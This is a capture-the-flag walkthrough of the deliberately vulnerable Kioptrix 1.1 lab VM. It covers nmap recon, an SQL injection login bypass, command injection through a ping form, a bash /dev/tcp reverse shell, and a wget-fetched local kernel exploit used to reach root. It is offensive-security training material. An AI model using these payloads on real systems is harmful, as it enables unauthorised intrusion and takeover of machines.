# CTF #4 - Kioptrix 1.1
Today I'm hacking into **Kioptrix 1.1**. Or Kioptrix #2. Whatever. This is one of the many **beginner-friendly OSCP-like** CTFs of Vulnhub. So it's a great starting point for preparing the OSCP tests. If you want to start with the previous level, check my walkthrough [**here!**](https://github.com/amtzespinosa/kioptrix-walkthrough)

But first, let's have a look to my setup:
## My Setup
- A VirtualBox VM running **Kali Linux.** 
- Another VM running **Kioptrix 1.1** You can download the .vmdk file **[**here.**](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)**
- A **local network** for both machines. If you want to know how to set up a local network for your VirtualBox adventures, follow [**this simple tutorial.**](https://github.com/amtzespinosa/secure-network-for-ctf)
- Coffee. You always need coffee for hacking.
- And today, to season this CTF session... Let's play some [**Instrumental Heavy Metal.**](https://www.youtube.com/watch?v=qY7_cQAubL0&t=3285s)

Now you are all set up and ready to go!

## Recon
As always, let's start with some recon with our ol' good friend **Nmap**. Let's run a fast/aggressive scan over the network. To do so, I use this command:

    sudo nmap -T4 -O -v 192.168.1.1/24

> **Note:** In real world situations, this scans may trigger firewalls and other network security appliances (in case the network is secure). If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable.

Okay, we are getting a good amount of info about Kioptrix 1.1. Let's have a look to the output while we run a more focused scan over Kioptrix.

    Nmap scan report for 192.168.1.38
    Host is up (0.00041s latency).
    Not shown: 994 closed tcp ports (reset)
    
    PORT     STATE SERVICE
    
    22/tcp   open  ssh
    80/tcp   open  http
    111/tcp  open  rpcbind
    443/tcp  open  https
    631/tcp  open  ipp
    3306/tcp open  mysql
    
    MAC Address: 08:00:27:79:1B:6D (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.30
    Uptime guess: 0.003 days (since Mon May 29 21:52:38 2023)
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=206 (Good luck!)
    IP ID Sequence Generation: All zeros

Let's start with the second scan.

    sudo nmap -p- -T4 -A -v 192.168.1.38

Whoa! A lot of info to review here:

    Nmap scan report for 192.168.1.38
    Host is up (0.00040s latency).
    Not shown: 65528 closed tcp ports (reset)
    
    PORT     STATE SERVICE  VERSION
    
    22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
    |_sshv1: Server supports SSHv1
    | ssh-hostkey: 
    |   1024 8f3e8b1e5863fecf27a318093b52cf72 (RSA1)
    |   1024 346b453dbacecab25355ef1e43703836 (DSA)
    |_  1024 684d8cbbb65abd7971b87147ea004261 (RSA)
    
    80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.0.52 (CentOS)
    
    111/tcp  open  rpcbind  2 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2            111/tcp   rpcbind
    |   100000  2            111/udp   rpcbind
    |   100024  1            761/udp   status
    |_  100024  1            764/tcp   status
    
    443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
    | sslv2: 
    |   SSLv2 supported
    |   ciphers: 
    |     SSL2_RC4_128_WITH_MD5
    |     SSL2_RC4_64_WITH_MD5
    |     SSL2_RC4_128_EXPORT40_WITH_MD5
    |     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
    |     SSL2_DES_192_EDE3_CBC_WITH_MD5
    |     SSL2_DES_64_CBC_WITH_MD5
    |_    SSL2_RC2_128_CBC_WITH_MD5
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
    | Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
    | Public Key type: rsa
    | Public Key bits: 1024
    | Signature Algorithm: md5WithRSAEncryption
    | Not valid before: 2009-10-08T00:10:47
    | Not valid after:  2010-10-08T00:10:47
    | MD5:   01de29f9fbfb2eb2beafe6243157090f
    |_SHA-1: 560c91966506fb0ffb8166b1ded3ac112ed4808a
    |_ssl-date: 2023-05-30T02:01:42+00:00; +5h59m59s from scanner time.
    |_http-server-header: Apache/2.0.52 (CentOS)
    
    631/tcp  open  ipp      CUPS 1.1
    | http-methods: 
    |   Supported Methods: GET HEAD OPTIONS POST PUT
    |_  Potentially risky methods: PUT
    |_http-title: 403 Forbidden
    |_http-server-header: CUPS/1.1
    
    764/tcp  open  status   1 (RPC #100024)
    
    3306/tcp open  mysql    MySQL (unauthorized)
    
    MAC Address: 08:00:27:79:1B:6D (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.30
    Uptime guess: 0.006 days (since Mon May 29 21:52:38 2023)
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=206 (Good luck!)
    IP ID Sequence Generation: All zeros
    
    Host script results:
    |_clock-skew: 5h59m58s
   

We can see some interesting ports open here. 

Port 22: Nothing interesting so far.

So let's start with HTTP/S. We have both ports open. **Port 80 is for http and port 443 for https.**  So the first thing we are going to do is open the browser and search for http://192.168.1.38 (in my case). We find a login page, let's keep going with the recon before trying anything here.

Visiting http://192.168.1.38:3306/ we see we are not allowed to connect to the MySQL server. 

Done with the recon then!

Back to the login page. This cheap looking login form is crying for some SQLi attempts. And so we do!  As soon as we try the good ol' vanilla `admin' or 1=1 #` in the username text field we get access to the administrator page!

Now we see another text field for pinging hosts in the same network. Let's ping ourselves and check the output:

    192.168.1.23
    
    PING 192.168.1.23 (192.168.1.23) 56(84) bytes of data.
    64 bytes from 192.168.1.23: icmp_seq=0 ttl=64 time=0.475 ms
    64 bytes from 192.168.1.23: icmp_seq=1 ttl=64 time=1.05 ms
    64 bytes from 192.168.1.23: icmp_seq=2 ttl=64 time=0.808 ms
    
    --- 192.168.1.23 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2000ms
    rtt min/avg/max/mdev = 0.475/0.780/1.058/0.239 ms, pipe 2

Looks like the output we get when pinging from the console so... would it be vulbnerable to **RCE (Remote Code Execution)**? Let's try to submit `192.168.1.23; whoami`

    192.168.1.23; whoami
    
    PING 192.168.1.23 (192.168.1.23) 56(84) bytes of data.
    64 bytes from 192.168.1.23: icmp_seq=0 ttl=64 time=0.713 ms
    64 bytes from 192.168.1.23: icmp_seq=1 ttl=64 time=0.569 ms
    64 bytes from 192.168.1.23: icmp_seq=2 ttl=64 time=0.647 ms
    
    --- 192.168.1.23 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2000ms
    rtt min/avg/max/mdev = 0.569/0.643/0.713/0.058 ms, pipe 2
    apache

Oh yeah! Vulnerable to RCE! We can `cat` the `/etc/passwd` to do some user enumeration as well. But why we don't just start a shell?

**On attaker's machine:**

    sudo nc -nvlp 443

**In the ping text field:**

    192.168.1.23 ; bash -i >& /dev/tcp/192.168.1.23/443 0>&1

And we have a shell! Now it's time to escalate privileges!

First, let's find out the kernel version and the release.

    uname -a
And we see that **kernel is 2.6.9**. Now, let's cat the release:

    cat /etc/*-release
And release is **CentOS 4.5** (final).

Back to our machine, let's find an exploit that suits best for these features:

    searchsploit linux 2.6 CentOS 

And there's an exploit that seems to fit our purpose. Let's mirror it into our machine:

    searchsploit -m linux/local/9545.c

Now we have to copy it into the `/var/www/html` folder and start apache.

    sudo service apache2 start
 
Back to kioptrix:

    wget 192.168.1.23/9545.c
    gcc 9545.c -o exploit
    chmod 777 exploit
    ./exploit

And there we go! Now we are root! Hope you find this easy CTF as fun as I did. I know, it's quite easy to hack into but, as I said, this is a beginner-friendly machine. It's good for learning the basics. See you soon and happy hacking!
